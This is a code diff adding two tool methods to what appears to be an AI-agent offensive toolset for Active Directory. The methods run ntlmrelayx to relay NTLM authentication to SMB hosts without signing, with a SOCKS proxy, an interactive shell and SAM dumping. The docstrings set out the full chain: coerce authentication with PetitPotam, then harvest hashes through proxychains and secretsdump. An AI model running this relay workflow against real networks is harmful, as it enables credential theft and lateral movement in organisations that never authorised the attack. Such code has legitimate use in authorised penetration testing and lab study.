@@ -351,3 +351,138 @@ class CoercionNetworkTools(Toolset):
 
         except Exception as e:
             return f"ntlmrelayx to ADCS failed: {e}"
+
+    @dn.tool_method
+    def ntlmrelayx_to_smb(
+        self,
+        target_ip: str,
+        socks: bool = True,
+        interactive: bool = False,
+    ) -> str:
+        """
+        Start ntlmrelayx to relay NTLM auth to SMB on hosts without SMB signing.
+
+        IMPORTANT: Only works against hosts where SMB signing is NOT required.
+        Use smb_signing_check first to identify relay targets.
+
+        Relays captured NTLM authentication to SMB, enabling:
+        - SOCKS proxy for tools like secretsdump
+        - Interactive shell execution
+        - SAM/LSA dump on successful relay
+
+        Attack workflow:
+        1. Identify SMB signing disabled hosts (smb_signing_check)
+        2. Start this relay targeting those hosts
+        3. Use coercion (petitpotam/coercer) to trigger auth from a privileged source
+        4. Use relayed session via SOCKS or capture dumped hashes
+
+        Args:
+            target_ip: IP of host with SMB signing disabled
+            socks: Enable SOCKS proxy for relayed sessions (default: True)
+            interactive: Enable interactive SMB shell (default: False)
+
+        Returns:
+            ntlmrelayx status
+
+        Example:
+            >>> ntlmrelayx_to_smb("192.168.58.50")
+        """
+        cmd = [
+            "ntlmrelayx.py",
+            "-t",
+            f"smb://{target_ip}",
+            "-smb2support",
+        ]
+
+        if socks:
+            cmd.append("-socks")
+
+        if interactive:
+            cmd.extend(["-i", "-c", "whoami"])
+
+        try:
+            logger.info(f"[*] Starting ntlmrelayx targeting SMB on {target_ip}")
+            stdout, stderr, _ = run_tool(cmd, timeout_seconds=30)
+
+            result = stdout + "\n" + (stderr or "")
+
+            socks_msg = ""
+            if socks:
+                socks_msg = (
+                    "\n→ SOCKS proxy enabled!\n"
+                    "→ After relay succeeds:\n"
+                    "   proxychains secretsdump.py -no-pass DOMAIN/USER@TARGET\n"
+                    "   proxychains smbclient.py -no-pass DOMAIN/USER@TARGET\n"
+                )
+
+            return (
+                "📋 NTLMRELAYX TO SMB STARTED\n"
+                f"→ Relaying to smb://{target_ip}\n"
+                "→ REQUIRES: SMB signing disabled on target\n"
+                "→ Use petitpotam/coercer to trigger authentication\n"
+                f"{socks_msg}\n" + result
+            )
+
+        except Exception as e:
+            return f"ntlmrelayx to SMB failed: {e}"
+
+    @dn.tool_method
+    def ntlmrelayx_multirelay(
+        self,
+        targets_file: str | None = None,
+        target_ips: str | None = None,
+        dump_sam: bool = True,
+    ) -> str:
+        """
+        Start ntlmrelayx to relay to multiple SMB targets simultaneously.
+
+        For attacking multiple hosts with SMB signing disabled.
+        Provide either a targets file or comma-separated IPs.
+
+        Args:
+            targets_file: Path to file containing target IPs (one per line)
+            target_ips: Comma-separated list of target IPs
+            dump_sam: Automatically dump SAM on successful relay (default: True)
+
+        Returns:
+            ntlmrelayx status
+
+        Example:
+            >>> ntlmrelayx_multirelay(target_ips="192.168.58.50,192.168.58.51")
+        """
+        if not targets_file and not target_ips:
+            return "Error: Provide either targets_file or target_ips"
+
+        cmd = [
+            "ntlmrelayx.py",
+            "-smb2support",
+            "-socks",
+        ]
+
+        if targets_file:
+            cmd.extend(["-tf", targets_file])
+        elif target_ips:
+            # Create temporary targets file
+            import tempfile
+
+            with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
+                for ip in target_ips.split(","):
+                    f.write(f"{ip.strip()}\n")
+                targets_file = f.name
+            cmd.extend(["-tf", targets_file])
+
+        try:
+            logger.info("[*] Starting ntlmrelayx multi-target SMB relay")
+            stdout, stderr, _ = run_tool(cmd, timeout_seconds=30)
+
+            result = stdout + "\n" + (stderr or "")
+            return (
+                "📋 NTLMRELAYX MULTI-TARGET STARTED\n"
+                "→ Relaying to multiple SMB targets\n"
+                "→ SOCKS proxy enabled for relayed sessions\n"
+                "→ Use petitpotam/coercer to trigger authentication\n"
+                "→ Sessions will appear in socks proxy\n\n" + result
+            )
+
+        except Exception as e:
+            return f"ntlmrelayx multi-relay failed: {e}"
